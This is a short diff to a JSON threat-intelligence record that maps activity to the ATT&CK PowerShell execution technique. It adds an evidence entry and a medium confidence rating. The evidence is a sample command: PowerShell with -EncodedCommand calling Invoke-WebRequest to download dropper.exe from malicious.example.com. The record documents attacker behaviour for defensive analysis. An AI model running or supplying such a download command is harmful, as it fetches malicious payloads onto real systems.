@@ -48,7 +48,11 @@ details
     {
       "technique_id": "T1059.001",
       "technique": "PowerShell",
-      "tactic": "Execution"
+      "tactic": "Execution",
+      "evidence": [
+        "powershell.exe -EncodedCommand Invoke-WebRequest http://malicious.example.com/dropper.exe"
+      ],
+      "confidence": "medium"
     }
   ]
 }
